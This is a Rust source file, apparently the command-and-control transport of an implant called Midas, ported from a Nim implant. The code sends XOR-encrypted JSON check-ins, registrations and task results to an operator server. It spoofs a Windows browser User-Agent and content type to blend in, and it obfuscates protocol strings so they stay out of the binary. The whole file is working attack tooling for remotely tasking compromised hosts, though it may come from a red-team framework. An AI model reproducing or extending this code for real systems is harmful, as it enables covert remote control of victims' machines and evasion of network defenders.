//! C2 transport.
//!
//! Byte-for-byte port of `implants/tombili/src/communication.nim`. The protocol
//! is a single HTTP POST to a catch-all route whose body is a repeating-key XOR
//! of a JSON document; the server is `server/altin/c2_routes.py`.
//!
//! ## XOR parity note
//!
//! The server's `xor_data` walks the decoded body as *characters* and builds the
//! result with `chr(ord(a) ^ ord(b))`. That is only equivalent to a byte-wise XOR
//! while both operands are ASCII. Every document Midas sends is ASCII because
//! `serde_json` escapes non-ASCII as `\uXXXX`, and every document the server
//! sends back is assembled from ASCII literals plus the ASCII task payloads
//! Midas sent it. So byte-wise XOR matches here.
//!
//! That is also why the decode side is `from_utf8_lossy` rather than an error:
//! if a future server change pushed a non-ASCII byte through, the Python side
//! would widen it to a multi-byte codepoint and a byte-wise decode would produce
//! mojibake. A lossy decode degrades to "invalid JSON" rather than a panic.

use serde_json::{json, Map, Value};

use crate::commands;
use crate::config;
use crate::obf;

/// Action discriminators. These must match `server/altin/agent.py:6-8`.
pub const ACTION_CHECKIN: i64 = 1;
pub const ACTION_REGISTER: i64 = 2;
pub const ACTION_TASK_RESULT: i64 = 3;

/// Response statuses. These must match `server/altin/agent.py:10-14`.
pub const STATUS_ERROR: i64 = 0;
pub const STATUS_CONTINUE: i64 = 1;
pub const STATUS_TASKS: i64 = 2;
pub const STATUS_REGISTER: i64 = 3;
pub const STATUS_INVALID: i64 = 4;

const ALL_STATUSES: [i64; 5] = [
    STATUS_ERROR,
    STATUS_CONTINUE,
    STATUS_TASKS,
    STATUS_REGISTER,
    STATUS_INVALID,
];

/// Repeating-key XOR over the raw bytes.
pub fn xor(data: &str, key: &str) -> String {
    let key_bytes = key.as_bytes();
    if key_bytes.is_empty() {
        return data.to_string();
    }

    let mut out = Vec::with_capacity(data.len());
    for (i, byte) in data.as_bytes().iter().enumerate() {
        out.push(byte ^ key_bytes[i % key_bytes.len()]);
    }

    String::from_utf8_lossy(&out).into_owned()
}

/// The address reported as this agent's identity half.
///
/// The server keys agents on `(implant_id, ip)`, both supplied by the client
/// with no server-issued nonce, so this is a label and not an authenticator. It
/// is whatever the host's primary interface reports.
fn local_ip() -> String {
    match local_ip_address::local_ip() {
        Ok(addr) => addr.to_string(),
        Err(_) => obf!("unknown"),
    }
}

/// Build a JSON object from runtime-computed keys.
///
/// `serde_json::json!` only accepts literal keys, and every key here goes
/// through `obf!` so the plaintext protocol field names stay out of the binary.
fn jobj(pairs: Vec<(String, Value)>) -> Value {
    let mut map = Map::new();
    for (key, value) in pairs {
        map.insert(key, value);
    }
    Value::Object(map)
}

/// The `{implant_id, ip, action, ..}` envelope shared by all three actions.
fn envelope(action: i64, extra: Vec<(String, Value)>) -> Value {
    let mut pairs: Vec<(String, Value)> = vec![
        (obf!("implant_id"), json!(config::IMPLANT_ID)),
        (obf!("ip"), json!(local_ip())),
        (obf!("action"), json!(action)),
    ];
    pairs.extend(extra);
    jobj(pairs)
}

/// POST an encrypted payload and return the decoded response document.
fn exchange(payload: &Value) -> Result<Value, String> {
    let key = config::xor_key();
    let url = config::server_url();

    let encrypted = xor(&payload.to_string(), &key);
    let body = ureq::post(&url)
        // The catch-all route reads `request.data`, so the content type is
        // irrelevant to it; this is only here to look ordinary.
        .set("Content-Type", "text/plain; charset=utf-8")
        .set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .send_string(&encrypted)
        .map_err(|e| format!("POST {url} failed: {e}"))?
        .into_string()
        .map_err(|e| format!("could not read response body: {e}"))?;

    let plaintext = xor(&body, &key);
    serde_json::from_str(&plaintext)
        .map_err(|e| format!("response was not valid JSON after decoding: {e}"))
}

/// Pull the status out of a response, rejecting anything outside the protocol's
/// five defined values. Tombili does the same check on the implant side so a
/// desynchronised server cannot be mistaken for a successful call.
fn status_of(response: &Value) -> Result<i64, String> {
    let status = response
        .get(obf!("status"))
        .and_then(|s| s.as_i64())
        .ok_or_else(|| obf!("response had no integer `status` field"))?;

    if ALL_STATUSES.contains(&status) {
        Ok(status)
    } else {
        Err(format!("unrecognised status {status}"))
    }
}

/// Sends the implant's capability manifest. The server stores it verbatim and
/// the Web UI builds its operator forms from it, so this is what defines
/// Midas' console.
pub fn send_registration() -> Result<i64, String> {
    let registration = jobj(vec![
        (obf!("os"), json!(config::OS)),
        (obf!("commands"), commands::manifest()),
    ]);

    let response = exchange(&envelope(
        ACTION_REGISTER,
        vec![(obf!("registration"), registration)],
    ))?;

    status_of(&response)
}

pub fn send_task_result(task_id: &str, result: &str) -> Result<i64, String> {
    let body = jobj(vec![
        (obf!("task_id"), json!(task_id)),
        (obf!("result"), json!(result)),
    ]);

    let response = exchange(&envelope(
        ACTION_TASK_RESULT,
        vec![(obf!("result"), body)],
    ))?;

    status_of(&response)
}

/// What a check-in came back with.
pub enum Checkin {
    /// The server had tasks queued.
    Tasks(Vec<Value>),
    /// The server does not know this agent any more, so it wants a fresh
    /// registration. This happens when the agent row was deleted from the Web UI
    /// mid-round.
    NeedsRegistration,
    /// Nothing to do.
    Idle,
}

/// One check-in.
///
/// The server replies with every task where `completed == false` and re-sends
/// them on each check-in until a result lands, so a command whose result is
/// lost runs again. That is the server's delivery model, not something this
/// layer can fix.
pub fn checkin() -> Result<Checkin, String> {
    let response = exchange(&envelope(ACTION_CHECKIN, Vec::new()))?;

    match status_of(&response)? {
        STATUS_TASKS => {
            let tasks = response
                .get(obf!("tasks"))
                .and_then(|tasks| tasks.as_array())
                .cloned()
                .ok_or_else(|| obf!("status was TASKS but no `tasks` array was present"))?;

            Ok(Checkin::Tasks(tasks))
        }
        STATUS_REGISTER => Ok(Checkin::NeedsRegistration),
        _ => Ok(Checkin::Idle),
    }
}
